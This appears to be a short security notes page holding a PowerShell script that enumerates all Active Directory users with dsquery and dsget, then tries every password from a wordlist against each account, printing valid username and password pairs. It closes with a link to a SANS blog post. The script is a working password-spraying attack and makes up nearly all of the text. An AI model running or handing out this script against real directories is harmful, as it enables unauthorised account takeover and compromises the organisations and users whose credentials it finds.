# Scripting

## PowerShell

```powershell
dsquery.exe user -limit 0 > users.txt
foreach ($FDN in Get-Content .\users.txt) {
    $results = dsget.exe user $FDN -samid
    $samid = $results[1].replace(" ", "")
    Write-Output $samid
    foreach ($password in Get-Content .\password.txt) {
        $password = $password.replace(" ", "")
        dsget.exe user $FDN -u $samid -p $password > $null
        if ($?) {
            Write-Output "Account: $samid\tPassword $password"
        }
    }
}
```

---
## References

### SANS

- [SANS: Usernames Matter More than Passwords](https://web.archive.org/web/20111008220143/https://it-audit.sans.org/blog/2011/09/21/usernames-matter-more-than-passwords)